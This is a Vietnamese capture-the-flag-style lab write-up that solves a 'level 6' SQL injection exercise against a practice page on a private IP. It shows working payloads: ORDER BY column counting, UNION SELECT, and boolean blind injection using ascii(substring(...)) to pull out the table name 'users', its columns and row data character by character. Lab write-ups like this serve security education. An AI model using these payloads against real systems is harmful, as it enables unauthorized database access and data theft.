# Task 04

> Tên tài liệu: Giải level 6.

> Thực hiện: Nguyễn Minh Nhật

> Cập nhật lần cuối: 19/02/2017

## Mục lục:

[1.Giải level 6 ?](#injection)

## Nội dung.

<a name="injection"></a>

### 1 Giải level 6.

- **B1** ta thử thêm dấu `'` or `"` để xem có bị lỗi không.

- Ta thấy trang bị mất dữ liệu => bị lỗi có thể khai thác được.

- **B2** Tiếp theo ta sử dụng `ORDER BY` để xem có bao nhiêu cột trong `CSDL`.

- Cú pháp: `ORDER BY 5-- -`, ta thấy nó báo lỗi => `ORDER BY` bình thường không được rồi.

![a](http://imageshack.com/a/img923/3549/Gkj4iv.png)

- Ta thử thay khoảng trống bằng `+` => ok

![a](http://imageshack.com/a/img922/5691/htZGN4.png)

- => có 5 cột.

- **B3** Dùng `UNION SELECT` để tìm cột bị lỗi và khai thác.

![a](http://imageshack.com/a/img924/8483/G6txja.png)

- **B4** Khai thác những thông tin cần thiết.

- Ta khai thác như bình thường `UNION SELECT 1,2,3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -`, Bypass đủ thứ vẫn báo lỗi `ERROR INTEGER REQUIRED` => sử dụng `Blind Injection`.

- Ta sử dụng Blind để lấy giá trị đầu tiên của câu truy vấn và trả kí tự ấy về mã ASCII để check, mò từ từ nó ra tên `table`.

- Sử dụng cú pháp: `and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=117`.

> `ascii()`: chuyển 1 kí tự về mã ASCII, có 1 hàm chức năng tương tự là `ord()`.

> `substring()`: cắt các kí tự từ 1 chuỗi.

- Dùng các toán tử `>` `<` `=` để check và tìm ra mã `ASCII` và => kí tự.

![a](http://imageshack.com/a/img922/2076/aMYRid.png)

- 117 => chứ `u`

- Tương tự ta dùng các toán tử `>` `<` `=` để check và tìm ra mã `ASCII`, mò ra kí tự.

- Ta tăng tham số của `substring` lên 2,1 để xét đến kí tự thứ 2, cứ thế tăng lên mà check.

- Tăng giá trị của `LIMIT` và tham số của hàm `substring` để check kí tự muốn tìm kiếm nhé.

- `http://192.168.85.138/sqli/example6.php?id=2 and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=115` => chữ `s`

- `http://192.168.85.138/sqli/example6.php?id=2 and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))=101` =>  `e`

- `http://192.168.85.138/sqli/example6.php?id=2 and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),4,1))=114` => `r`

- `http://192.168.85.138/sqli/example6.php?id=2 and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),5,1))=115` => `s`

- Nếu ta check mã ascii của kí tự đó mà > 0 trả về fasle -> được độ dài của kí tự đó, đến đây là hết.

- `http://192.168.85.138/sqli/example6.php?id=2 and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1))>0`

![a](http://imageshack.com/a/img922/5218/08pa1V.png)

- Nó chỉ có  5 kí tự là `users`.

- Vậy là ta tìm được table là `users`.

- Ta tiếp tục mò ra các cột trong table `users`.

- `http://192.168.85.138/sqli/example6.php?id=2 and ascii(substring((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),1,1))=110`

![a](http://imageshack.com/a/img923/4432/HtLBaF.png)

- Check tương tự từ từ cứ mò ra tất cả các cột.

- Tiếp tục check tìm ra dữ liệu trong các cột đó bằng cú pháp `http://192.168.85.138/sqli/example6.php?id=2 and ascii(substring((select name from users limit 0,1),1,1))=97`

- Cứ check check là ra được tất cả dữ liệu có điều hơi lâu mà thôi.

![a](http://imageshack.com/a/img922/5136/5fwuJP.png)

### Thanks you for watching !
